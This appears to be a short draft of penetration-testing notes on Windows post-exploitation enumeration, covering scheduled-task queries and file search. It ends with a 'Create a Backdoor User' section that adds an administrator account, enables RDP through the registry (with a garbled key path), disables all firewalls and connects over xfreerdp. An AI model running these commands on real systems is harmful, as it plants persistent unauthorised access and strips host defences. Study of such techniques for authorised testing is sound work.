# Windows Enumeration

### Rough Draft

#### schtasks

Allows you to see the scheduled tasks on your local box (once you have a shell/ssh session). The following is command useful as it will essentially answer the quesion, if we can exploit this, what kind of priviledges will we gain:

```bash
schtasks /query
...
schtasks /query /fo LIST /v /TN "FTP Backup"
```

#### type 

The Windows equivalent of cat.

#### findstr

The Windows equivalent of grep.

#### Recursively Search Through Directories 

```bash
dir /s/b file.txt
```

#### Create a Backdoor User

You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
```bash
net user /add backdoor Password1
...
net localgroup administrators /add backdoor
...
# Enables RDP Connections
add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
...
# Disable the Firewalls
netsh advfirewall set allprofiles state off
...
# RDP In & Allow Clipboard Sharing
xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore

```
